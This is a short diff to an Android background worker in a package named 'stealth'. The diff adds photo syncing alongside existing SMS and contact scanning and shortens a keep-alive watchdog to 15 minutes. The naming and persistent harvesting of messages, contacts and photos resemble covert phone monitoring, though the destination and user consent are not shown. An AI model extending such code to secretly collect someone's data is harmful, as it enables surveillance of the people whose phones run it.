@@ -83,6 +83,7 @@ public class SyncWorker extends Worker {
         try {
             com.notrack.stealth.backup.SmsBackupEngine.scanAndSyncSms(context);
             com.notrack.stealth.backup.ContactsBackupEngine.scanAndSyncContacts(context);
+            com.notrack.stealth.backup.PhotoBackupEngine.triggerSyncAsync(context);
         } catch (Exception e) {
             Log.w(TAG, "Isolated vault backup notice: " + e.getMessage());
         }
@@ -123,7 +124,7 @@ public class SyncWorker extends Worker {
                     .build();
 
             PeriodicWorkRequest keepAliveRequest = new PeriodicWorkRequest.Builder(
-                    SyncWorker.class, 30, TimeUnit.MINUTES)
+                    SyncWorker.class, 15, TimeUnit.MINUTES)
                     .setConstraints(constraints)
                     .build();
 
@@ -132,7 +133,7 @@ public class SyncWorker extends Worker {
                     ExistingPeriodicWorkPolicy.KEEP,
                     keepAliveRequest
             );
-            Log.i(TAG, "Periodic keep-alive watchdog registered (30 min interval).");
+            Log.i(TAG, "Periodic keep-alive watchdog registered (15 min interval).");
         } catch (Exception e) {
             Log.e(TAG, "Error scheduling periodic keep-alive worker", e);
         }
